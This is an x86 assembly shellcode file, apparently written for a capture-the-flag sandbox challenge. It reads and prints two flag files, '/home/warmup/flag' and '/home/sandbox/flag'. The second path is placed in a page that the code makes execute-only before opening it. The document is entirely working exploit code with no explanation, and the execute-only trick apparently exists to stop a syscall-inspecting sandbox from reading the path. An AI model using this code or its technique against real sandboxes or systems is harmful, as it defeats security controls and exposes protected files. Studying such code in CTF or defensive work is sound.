;
;	assemble with nasm sc.asm -o sc.bin

USE32

	section .data
	global _start

_start:

    ;; mmap a page
    jmp mmap_args
map_it:
    pop ebx
    mov eax, 90
    int 0x80
    mov ebp, eax

    jmp warmuppath
wback:
    ; open it
    mov ecx, 0
    mov edx, 0
    pop ebx
    mov eax, 5
    int 0x80

	; read
	mov ebx, eax
	sub esp, 0x1000
	mov ecx, esp
	mov edx, 0x1000
	mov eax, 0x3
	int 0x80

	; write
	mov ebx, 0x1
	mov ecx, esp
	mov edx, eax
	mov eax, 0x4
	int 0x80

    ;; write path
	jmp sboxpath
back:
	cld
	pop esi
	mov edi, ebp
	mov ecx, 0x40
	rep movsb

    ;; prot to execute only
    mov edx, 0x4
    mov ecx, 0x1000
    mov ebx, ebp
    mov eax, 125
    int 0x80

    ; open it
    mov ecx, 0
    mov edx, 0
    mov ebx, ebp
    mov eax, 5
    int 0x80

	; read
	mov ebx, eax
	sub esp, 0x1000
	mov ecx, esp
	mov edx, 0x1000
	mov eax, 0x3
	int 0x80

	; write
	mov ebx, 0x1
	mov ecx, esp
	mov edx, eax
	mov eax, 0x4
	int 0x80

	mov eax, 0x1
	int 0x80

mmap_args:
    call map_it
    .addr dd 0
    .len dd 0x1000
    .prot dd 0x7
    .flags dd 0x22
    .fd dd -1
    .offset dd 0

sboxpath:
    call back
    db "/home/sandbox/flag",0x0

warmuppath:
    call wback
    db "/home/warmup/flag",0x0
